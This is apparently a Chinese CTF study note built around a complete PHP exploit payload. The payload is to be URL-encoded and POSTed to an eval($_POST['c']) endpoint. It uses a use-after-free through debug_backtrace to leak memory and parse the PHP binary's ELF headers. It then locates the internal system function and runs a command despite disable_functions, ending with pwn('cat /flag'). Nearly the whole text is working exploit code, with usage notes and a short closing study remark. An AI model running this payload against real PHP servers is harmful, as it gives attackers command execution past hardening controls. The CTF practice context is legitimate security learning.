**注意**：此 Payload 需通过 POST 发送，且**必须进行 URL Encode**。脚本已精简去除了 `<?php` 头，且在末尾添加 `exit()` 防止输出被清洗。

```php
// 场景: disable_functions 禁用了 system, exec, putenv, FFI 等所有入口
// 源码: 
eval($_POST['c']);

// Payload (POST Body):
// -------------------- 复制以下内容并 URL Encode --------------------
function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }
    class Helper {
        public $a, $b, $c, $d;
    }
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
            if($p_type == 1 && $p_flags == 6) { 
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }
        if(!$data_addr || !$text_size || !$data_size)
            return false;
        return [$data_addr, $text_size, $data_size];
    }
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
            return $data_addr + $i * 8;
        }
    }
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    function trigger_uaf($arg) {
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
    $helper = new Helper;
    $helper->b = function ($x) { };
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
    $closure_obj = str2ptr($abc, 0x20);
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 
    
    ($helper->b)($cmd);
    exit();
}

pwn("cat /flag");
```

---

# 本周学习总结

unictf加油吧
